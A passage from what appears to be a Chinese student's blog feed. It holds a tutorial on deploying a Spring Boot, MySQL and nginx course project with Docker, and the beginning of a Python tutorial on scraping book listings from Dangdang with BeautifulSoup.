        <content type="html"><![CDATA[<p>写在前面：致敬软院传奇专业核心课程软工二：大作业卷得飞起<del>(怎么有小组做了10个自由需求甚至做了CICD的啊)</del>，上课全在讲笑话期末考得一坨屎<del>(本fw期末喜提卷面68分)</del>。因为sb课程部署项目会加分，故有了这篇快速教学文章(文章不会涉及原理，只教如何使用工具)，希望能对学习部署的人有所帮助。</p><h2 id="一、下载docker"><a href="#一、下载docker" class="headerlink" title="一、下载docker"></a>一、下载docker</h2><ul><li><p>在你的云服务器上(一般都是选择ubuntu系统)执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install docker.io docker-buildx</span><br></pre></td></tr></table></figure></li><li><p>下载完docker后因为docker的官方源需要梯子，所以要更换镜像源，进入<code>/etc/docker</code>文件夹并创建<code>daemon.json</code>文件，加入以下内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;https://docker.m.daocloud.io&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><p>添加完毕之后输入<code>sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</code>命令重新启动docker，这一步之后输入<code>docker run hello-world</code>查看是否能够正常拉取镜像，结果应该如图所示：</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/dfe43bf78d3322e1e8d31d56f924d977.png" alt="拉取hello-world镜像"></p><p>至此，docker的安装已完成。</p><p>安装完成后可以先为你的项目创建一个网络，使用<code>docker network create your_network_name</code></p><h2 id="二、部署mysql"><a href="#二、部署mysql" class="headerlink" title="二、部署mysql"></a>二、部署mysql</h2><ul><li><p><code>mysql</code>的部署非常简单，输入以下命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name mysql --network your_network_name -p 3306:3306 \</span><br><span class="line">  -e MYSQL_ROOT_PASSWORD=your_root_password -e MYSQL_DATABASE=your_database_name \</span><br><span class="line">  mysql:latest</span><br></pre></td></tr></table></figure></li></ul><p>然后再输入<code>docker ps</code>查看部署情况：</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/017639f4d7b60ceeedec7233fcd0061b.png" alt="017639f4d7b60ceeedec7233fcd0061b"></p><h2 id="三、部署后端"><a href="#三、部署后端" class="headerlink" title="三、部署后端"></a>三、部署后端</h2><ul><li>在部署后端之前，要先对后端项目进行打包，需要使用maven工具。下面以idea来做演示：</li></ul><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/5bc1b6124afb368fc6305922ff0882a1.png" alt="使用maven打包后端"></p><p>​打包完成之后，在<code>target/</code>目录下会出现一个jar包，这个jar包就是我们部署后端需要的核心部件。</p><ul><li><p>创建<code>/opt/your_project_name/backend</code>目录来存放后端部署文件，将上面的jar包放入该文件夹，同时我们还需要后端运行的配置文件(<code>yaml</code>文件或者是<code>properties</code>文件)和<code>Dockerfile</code>部署文件。</p></li><li><p><code>application.yaml</code>(示例)文件如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://mysql:3306/smartpricing?characterEncoding=utf-8&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=Asia/Shanghai&amp;useSSL=false</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">  <span class="attr">jpa:</span></span><br><span class="line">    <span class="attr">hibernate:</span></span><br><span class="line">      <span class="attr">ddl-auto:</span> <span class="string">update</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure></li></ul><p>​注意这里的<code>url</code>不再是<code>mysql://localhost:3306</code>而是<code>mysql://mysql:3306</code>，也就是把主机名换成了你部署的<code>mysql</code>的容器名。</p><ul><li><p><code>Dockerfile</code>(示例)文件如下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用官方的 OpenJDK 21 基础镜像</span></span><br><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt/smart-pricing/backend</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 JAR 文件和 application.yml 复制到工作目录中</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> smart-pricing.jar ./smart-pricing.jar</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> application.yml ./config/application.yml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置时区为上海</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Asia/Shanghai&quot;</span> &gt; /etc/timezone</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露应用程序端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定容器启动时执行的命令，运行 Spring Boot 应用</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;java -Dspring.config.location=file:./config/application.yml -jar smart-pricing.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure></li></ul><p>​因为本地后端配置和云服务器的后端配置文件不一样，所以需要指定选择配置文件来运行。</p><ul><li><p>这三个文件都准备好后，就在该目录下执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t your_backend_name:1.0.0 .</span><br><span class="line">docker run -d -p 8080:8080 --name your_backend_container_name --network your_network_name your_backend_name:1.0.0</span><br></pre></td></tr></table></figure></li></ul><p>输入<code>docker ps</code>查看部署情况：</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/8102b7624f46ac70b15808619bd45907.png" alt="查看后端部署情况"></p><p>至此后端部署完成。</p><h2 id="四、部署前端"><a href="#四、部署前端" class="headerlink" title="四、部署前端"></a>四、部署前端</h2><ul><li><p>和后端一样，在部署前端之前要先对前端项目进行打包。直接在前端项目目录下输入命令<code>npm run build</code>既可完成打包。成功之后应该会生成一个<code>dist/</code>文件夹，这个文件夹里面的东西就是我们部署需要的资源。</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/f993850605cb0bc06581c4525c984ba6.png" alt="dist文件夹"></p></li><li><p>创建目录<code>/opt/your_project_name/nginx</code>和<code>/opt/your_project_name/nginx/html</code>，将<code>dist/</code>文件下的全部东西都放<code>html/</code>文件下，然后在<code>nginx/</code>文件夹下我们还需要一个<code>nginx.conf</code>文件来配置nginx服务。</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/015635b869338c4c2d393fa45af91a0c.png" alt="nginx文件结构"></p></li><li><p><code>nginx.conf</code>文件(示例)如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>; //处理器使用数量</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">256</span>;  //最大连接数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span>  your_sever_public_ip;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> / &#123;  //资源定位</span><br><span class="line">            <span class="attribute">root</span>   /usr/share/nginx/html;</span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> /prod-api/ &#123;  //将/prod-api请求转发到后端</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://your_backend_container_name:8080/;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">        <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这里是监听<code>/prod-api</code>请求并转发到后端的8080端口，所以不要修改你前端的<code>main.ts</code>文件：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="property">defaults</span>.<span class="property">baseURL</span> = (<span class="string">&quot;http://your_sever_public_ip/prod-api&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>最后执行以下命令来部署nginx：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80 \</span><br><span class="line">  -v /opt/ruoyi/nginx/nginx.conf:/etc/nginx/nginx.conf -v /opt/ruoyi/nginx/html:/usr/share/nginx/html \</span><br><span class="line">  --name your_nginx_container_name --network your_network_name \</span><br><span class="line">  nginx:latest</span><br></pre></td></tr></table></figure></li></ul><p>输入<code>docker ps</code>来查看服务：</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/70d45e59357c2f555d9c4f088687f0d9.png" alt="查看nginx服务"></p><p>至此，三个服务都已部署成功。</p><h2 id="五、一些踩过的坑"><a href="#五、一些踩过的坑" class="headerlink" title="五、一些踩过的坑"></a>五、一些踩过的坑</h2><ul><li><p>jar包运行失败或者是找不到主类。运行失败可能是jdk版本的问题，如果是找不到主类的话检查后端的<code>pom.xml</code>文件，为主类添加<code>&lt;skip&gt;</code>配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.example.smartpricing.SmartPricingApplication<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">skip</span>&gt;</span>false<span class="tag">&lt;/<span class="name">skip</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时本地可以通过命令<code>java -jar your_jar_name.jar</code>来检查jar包能否正常运行，部署完后也可以通过命令<code>docker logs your_backend_container_name</code>来检查后端是否已经正常启动。</p></li><li><p>http访问公网ip显示无法访问此页面。检查你的云服务器是否开放了80(http)端口，如果没有将其开放即可。</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/8d67382ae1d5d4442d5a010d6a840be7.png" alt="检查http端口"></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 后端 </tag>
            
            <tag> Docker </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当当网数据爬取脚本</title>
      <link href="/post/7d2474f8.html"/>
      <url>/post/7d2474f8.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：因为这学期上了软院传奇屎课软工2，为了更好地展示大作业(图书商城)的效果，故写了个爬虫爬取了当当网的数据。</p><h2 id="一、获取Cookie"><a href="#一、获取Cookie" class="headerlink" title="一、获取Cookie"></a>一、获取Cookie</h2><p>因为不登陆的话当当网是有访问次数限制的，所以需要获取个人Cookie来维持登录状态。Cookie的获取非常简单，只需要在浏览器登录当当网后按下f12打开开发者工具，选择网络后再刷新一下页面，选择其中某一个元素就能查看到Cookie。</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post7/e9f5d94557761a286babeecadcfdbbb4.png" alt="获取cookie"></p><p>相关的登陆代码大致如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">    <span class="variable language_">self</span>.headers = &#123; <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    <span class="variable language_">self</span>.session.headers.update(<span class="variable language_">self</span>.headers)   </span><br><span class="line">    <span class="comment"># 直接从cookie.txt加载Cookie</span></span><br><span class="line">    <span class="variable language_">self</span>.load_cookies_from_file()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_cookies_from_file</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从cookie.txt文件加载Cookie数据&quot;&quot;&quot;</span></span><br><span class="line">    cookie_file = <span class="string">&quot;cookie.txt&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(cookie_file):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(cookie_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                cookie_str = f.read().strip()</span><br><span class="line">                <span class="keyword">if</span> cookie_str:</span><br><span class="line">                    <span class="comment"># 解析Cookie字符串并添加到会话中</span></span><br><span class="line">                    cookies = &#123;&#125;</span><br><span class="line">                    <span class="keyword">for</span> item <span class="keyword">in</span> cookie_str.split(<span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">                        <span class="keyword">if</span> item:</span><br><span class="line">                            item = item.strip()</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">                                key, value = item.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                                cookies[key] = value</span><br><span class="line">                        </span><br><span class="line">                    <span class="comment"># 将Cookie添加到会话</span></span><br><span class="line">                    <span class="variable language_">self</span>.session.cookies.update(cookies)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;已从cookie.txt加载Cookie数据&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;cookie.txt文件为空&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;加载Cookie数据失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;未找到cookie.txt文件，将使用无登录状态访问&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;提示: 请从浏览器开发者工具中复制Cookie并保存到同目录的cookie.txt文件中&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="二、分析网页元素"><a href="#二、分析网页元素" class="headerlink" title="二、分析网页元素"></a>二、分析网页元素</h2><p>这步更简单，只需要分析网页结构即可<del>(剩下的交给ai)</del>。下面以爬某个商品的图片链接来说明：打开商品详情页面，对准商品图片按下鼠标右键，在选项框里选择“检查”，</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post7/2025-06-25%20181702.png" alt="检查"></p><p>然后在弹出的开发者工具中就会显示图片对应的网页结构，</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post7/dd74f6e7de8e2a17d0d90a7967218603.png" alt="图片网页结构"></p><p>从html文件中可以看到商品图片对应的模块是id为<code>largePic</code>的<code>img</code>块，我们可以给ai描述为“从id为largePic的img块中获取src的内容，并在链接前面添加‘https:’。”</p><p>获取链接的核心代码如下(使用了<code>BeautifulSoup</code>包)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cover_elem = soup.select_one(<span class="string">&#x27;img#largePic&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> cover_elem <span class="keyword">and</span> cover_elem.has_attr(<span class="string">&#x27;src&#x27;</span>):</span><br><span class="line">    src = cover_elem[<span class="string">&#x27;src&#x27;</span>]</span><br><span class="line">    product_info[<span class="string">&quot;cover&quot;</span>] = <span class="string">f&quot;https:<span class="subst">&#123;src&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><p>其余的相关信息也是依法炮制，比如要获取标题信息就对标题进行检查，要获取作者信息就对准作者信息进行检查，这里给出我获取的一些商品信息的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract_product_info</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从商品页面提取详细信息&quot;&quot;&quot;</span></span><br><span class="line">    soup = <span class="variable language_">self</span>.fetch_page(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> soup:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 初始化商品信息字典</span></span><br><span class="line">    product_info = &#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;price&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;rate&quot;</span>: <span class="number">6</span>,  <span class="comment"># 根据要求默认为6</span></span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cover&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;detail&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;specifications&quot;</span>: [</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;作者&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;副标题&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,  <span class="comment"># 根据要求设置为空字符串</span></span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;ISBN&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;帧装&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;页数&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,  <span class="comment"># 根据要求设置为空字符串</span></span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;出版社&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;出版日期&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># ①提取title</span></span><br><span class="line">    title_elem = soup.select_one(<span class="string">&#x27;div.name_info h1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> title_elem <span class="keyword">and</span> title_elem.has_attr(<span class="string">&#x27;title&#x27;</span>):</span><br><span class="line">        full_title = title_elem[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        <span class="comment"># 确保full_title是字符串</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(full_title, <span class="built_in">list</span>):</span><br><span class="line">            full_title = <span class="string">&#x27;&#x27;</span>.join(full_title)</span><br><span class="line">            <span class="comment"># 处理title，截取到第一个&#x27;（&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;（&#x27;</span> <span class="keyword">in</span> full_title:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title.split(<span class="string">&#x27;（&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> full_title:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title.split(<span class="string">&#x27;(&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27; &#x27;</span> <span class="keyword">in</span> full_title:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title</span><br><span class="line">    <span class="comment"># ②提取price</span></span><br><span class="line">    price_elem = soup.select_one(<span class="string">&#x27;p#dd-price&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> price_elem:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 提取数字部分</span></span><br><span class="line">            price_text = <span class="string">&#x27;&#x27;</span>.join(c <span class="keyword">for</span> c <span class="keyword">in</span> price_elem.text <span class="keyword">if</span> c.isdigit() <span class="keyword">or</span> c == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            product_info[<span class="string">&quot;price&quot;</span>] = <span class="built_in">float</span>(price_text)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># ④提取description</span></span><br><span class="line">    desc_elem = soup.select_one(<span class="string">&#x27;span.head_title_name&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> desc_elem <span class="keyword">and</span> desc_elem.has_attr(<span class="string">&#x27;title&#x27;</span>):</span><br><span class="line">        product_info[<span class="string">&quot;description&quot;</span>] = desc_elem[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">    <span class="comment"># ⑤提取cover</span></span><br><span class="line">    cover_elem = soup.select_one(<span class="string">&#x27;img#largePic&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cover_elem <span class="keyword">and</span> cover_elem.has_attr(<span class="string">&#x27;src&#x27;</span>):</span><br><span class="line">        src = cover_elem[<span class="string">&#x27;src&#x27;</span>]</span><br><span class="line">        product_info[<span class="string">&quot;cover&quot;</span>] = <span class="string">f&quot;https:<span class="subst">&#123;src&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># ⑦提取作者、出版社、出版日期</span></span><br><span class="line">    messbox = soup.select_one(<span class="string">&#x27;div.messbox_info&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> messbox:</span><br><span class="line">        spans = messbox.select(<span class="string">&#x27;span&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(spans) &gt; <span class="number">0</span>:</span><br><span class="line">            author_elem = spans[<span class="number">0</span>].select_one(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> author_elem:</span><br><span class="line">                product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">0</span>][<span class="string">&quot;value&quot;</span>] = author_elem.text.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(spans) &gt; <span class="number">1</span>:</span><br><span class="line">            publisher_elem = spans[<span 